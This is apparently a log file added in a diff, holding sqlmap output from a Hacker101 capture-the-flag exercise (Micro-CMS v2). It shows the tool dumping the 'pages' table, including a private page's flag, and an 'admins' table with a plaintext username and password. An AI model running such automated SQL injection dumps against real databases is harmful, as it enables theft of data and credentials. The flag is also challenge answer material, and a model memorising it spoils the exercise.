@@ -1,0 +1,78 @@
+[00:07:19] [INFO] fetching current database
+[00:07:20] [INFO] retrieved: 'level2'
+[00:07:20] [INFO] fetching tables for database: 'level2'
+[00:07:21] [INFO] retrieved: 'admins'
+[00:07:21] [INFO] retrieved: 'pages'
+[00:07:21] [INFO] fetching columns for table 'pages' in database 'level2'
+[00:07:23] [INFO] retrieved: 'id'
+[00:07:23] [INFO] retrieved: 'int(11)'
+[00:07:24] [INFO] retrieved: 'public'
+[00:07:24] [INFO] retrieved: 'tinyint(1)'
+[00:07:25] [INFO] retrieved: 'title'
+[00:07:25] [INFO] retrieved: 'varchar(256)'
+[00:07:26] [INFO] retrieved: 'body'
+[00:07:31] [INFO] retrieved: 'mediumtext'
+[00:07:31] [INFO] fetching entries for table 'pages' in database 'level2'
+[00:07:35] [INFO] retrieved: 'asdf## Version 2\\r\\nThis version fixed the multitude of security flaw...
+[00:07:36] [INFO] retrieved: '1'
+[00:07:37] [INFO] retrieved: '1'
+[00:07:37] [INFO] retrieved: 'Micro-CMS Changelog'
+[00:07:40] [INFO] retrieved: 'Just testing some markdown functionality.\\n\\n![adorable kitten](https...
+[00:07:40] [INFO] retrieved: '2'
+[00:07:41] [INFO] retrieved: '1'
+[00:07:41] [INFO] retrieved: 'Markdown Test'
+[00:07:43] [INFO] retrieved: 'My secret is ^FLAG^fca791bb1ed6b32fab2aa4d70aab5d289afb52933106a2bd01ea...
+[00:07:43] [INFO] retrieved: '3'
+[00:07:44] [INFO] retrieved: '0'
+[00:07:44] [INFO] retrieved: 'Private Page'
+[00:07:45] [INFO] retrieved: 'asdfasdfasdfasdfasdfsadf'
+[00:07:45] [INFO] retrieved: '4'
+[00:07:46] [INFO] retrieved: '1'
+[00:07:47] [INFO] retrieved: 'asdf'
+[00:07:47] [INFO] retrieved: 'asdf'
+[00:07:48] [INFO] retrieved: '5'
+[00:07:49] [INFO] retrieved: '1'
+[00:07:49] [INFO] retrieved: 'asdf'
+[00:07:50] [INFO] retrieved: 'asdf'
+[00:07:50] [INFO] retrieved: '6'
+[00:07:51] [INFO] retrieved: '1'
+[00:07:52] [INFO] retrieved: 'asdf'
+Database: level2
+Table: pages
+[6 entries]
++----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| id | body                                                                                                                                                                                                                                                                                                                                     | title               | public |
++----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+| 1  | asdf## Version 2\\r\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\r\\n | Micro-CMS Changelog | 1      |
+| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                           | Markdown Test       | 1      |
+| 3  | My secret is ^FLAG^fca791bb1ed6b32fab2aa4d70aab5d289afb52933106a2bd01ea1ec217f87af6$FLAG$                                                                                                                                                                                                                                                | Private Page        | 0      |
+| 4  | asdfasdfasdfasdfasdfsadf                                                                                                                                                                                                                                                                                                                 | asdf                | 1      |
+| 5  | asdf                                                                                                                                                                                                                                                                                                                                     | asdf                | 1      |
+| 6  | asdf                                                                                                                                                                                                                                                                                                                                     | asdf                | 1      |
++----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
+
+[00:07:52] [INFO] table 'level2.pages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/4ba8651c6b7584c563d4bc974949eca8.ctf.hacker101.com/dump/level2/pages.csv'                                      
+[00:07:52] [INFO] fetching columns for table 'admins' in database 'level2'
+[00:07:53] [INFO] retrieved: 'id'
+[00:07:53] [INFO] retrieved: 'int(11)'
+[00:07:54] [INFO] retrieved: 'username'
+[00:07:54] [INFO] retrieved: 'varchar(256)'
+[00:07:55] [INFO] retrieved: 'password'
+[00:07:56] [INFO] retrieved: 'varchar(256)'
+[00:07:56] [INFO] fetching entries for table 'admins' in database 'level2'
+[00:07:57] [INFO] retrieved: '1'
+[00:07:57] [INFO] retrieved: 'clemencia'
+[00:07:58] [INFO] retrieved: 'despina'
+Database: level2
+Table: admins
+[1 entry]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | clemencia | despina  |
++----+-----------+----------+
+
+[00:07:58] [INFO] table 'level2.admins' dumped to CSV file '/home/kali/.local/share/sqlmap/output/4ba8651c6b7584c563d4bc974949eca8.ctf.hacker101.com/dump/level2/admins.csv'                                    
+[00:07:58] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/4ba8651c6b7584c563d4bc974949eca8.ctf.hacker101.com'                                                            
+
+[*] ending @ 00:07:58 /2022-10-09/
